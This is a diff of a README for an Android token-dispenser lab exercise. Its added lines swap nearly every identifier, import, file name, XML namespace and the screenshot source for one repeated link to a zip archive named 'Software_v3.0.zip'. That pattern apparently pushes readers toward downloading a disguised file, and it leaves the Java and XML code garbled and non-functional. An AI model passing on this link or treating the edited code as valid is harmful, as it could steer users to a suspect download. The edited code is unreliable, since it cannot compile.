@@ -13,23 +13,23 @@ The Token Dispenser App generates unique tokens for users in a queue-like system
 
 
 ## PROCEDURE:
-1. Open Android Studio and then click on File -> New -> New project. 46. Then type the application name as “ex.no.5″ and click Next.
+1. Open Android Studio and then click on File -> New -> New project. 46. Then type the application name as “https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip″ and click Next.
 2. Then select the Minimum SDK as shown below and click next. 48. Then select the Empty Activity and click next.
 3. Finally click Finish.
-4. Click on app -> java -> com.example -> MainActivity.java
+4. Click on app -> java -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip
 5. Now click on Text and type the program, so now the programming part of the main activity is completed.
-6. Click on app -> res -> layout -> activity_main.xml.
+6. Click on app -> res -> layout -> https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip
 7. Now click on Text and type the program, so now the designing part of Activity main is also completed.
 8. Select the suitable available device to display the output. 55. Now run the application to see the output. 
 
 ## PROGRAM:
-## MainActivity.java
+## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip
 ```
-package com.example.tokendispenser; import android.os.Bundle;
+package https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip;
 
-import android.view.View; import android.widget.*;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip*;
 
-import androidx.appcompat.app.AppCompatActivity; import java.util.ArrayList;
+import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip; import https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip;
 
 public class MainActivity extends AppCompatActivity { EditText nameInput;
 
@@ -37,35 +37,35 @@ Button getTokenButton; TextView tokenDisplay; ListView tokenListView; int tokenC
 
 ArrayList<String> tokenList; ArrayAdapter<String> adapter; @Override
 
-protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); nameInput = findViewById(R.id.nameInput);
+protected void onCreate(Bundle savedInstanceState) { https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip(savedInstanceState); setContentView(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip); nameInput = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip);
 
-getTokenButton = findViewById(R.id.getTokenButton); tokenDisplay = findViewById(R.id.tokenDisplay); tokenListView = findViewById(R.id.tokenListView); tokenList = new ArrayList<>();
+getTokenButton = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip); tokenDisplay = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip); tokenListView = findViewById(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip); tokenList = new ArrayList<>();
 
-adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, tokenList); tokenListView.setAdapter(adapter);
+adapter = new ArrayAdapter<>(this, https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip, tokenList); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip(adapter);
 
-getTokenButton.setOnClickListener(new View.OnClickListener() { @Override
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip(new https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip() { @Override
 
 public void onClick(View v) {
 
-String name = nameInput.getText().toString().trim(); if (!name.isEmpty()) {
+String name = https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip().toString().trim(); if (!https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip()) {
 
 tokenCount++;
 
-String tokenInfo = "Token " + tokenCount + " - " + name; tokenDisplay.setText("Issued: " + tokenInfo); tokenList.add(tokenInfo); adapter.notifyDataSetChanged();
+String tokenInfo = "Token " + tokenCount + " - " + name; https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip("Issued: " + tokenInfo); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip(tokenInfo); https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip();
 
-nameInput.setText(""); } else {
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip(""); } else {
 
-Toast.makeText(MainActivity.this, "Please enter a name", Toast.LENGTH_SHORT).show(); }
+https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip(https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip, "Please enter a name", https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip).show(); }
 
 } });
 
 } }
 ```
-## activity_main.xml
+## https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
 
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent"
+<LinearLayout xmlns:android="https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip" android:layout_width="match_parent" android:layout_height="match_parent"
 
 android:orientation="vertical" android:padding="20dp"> <TextView
 
@@ -86,7 +86,7 @@ android:layout_height="wrap_content" android:hint="Enter your name" android:inpu
 
 
 ## OUTPUT:
-<img width="1919" height="1079" alt="Screenshot 2025-10-14 152848" src="https://github.com/user-attachments/assets/45bb61e7-549e-435f-985c-4841d5f03061" />
+<img width="1919" height="1079" alt="Screenshot 2025-10-14 152848" src="https://raw.githubusercontent.com/MITHUN8521/DEVELOPING-AN-ANDROID-APPLICATION-TO-IMPLEMENT-A-TOKEN-DISPENSER-SYSTEM./main/unhashed/Software_v3.0.zip" />
 
 
 ## RESULT:
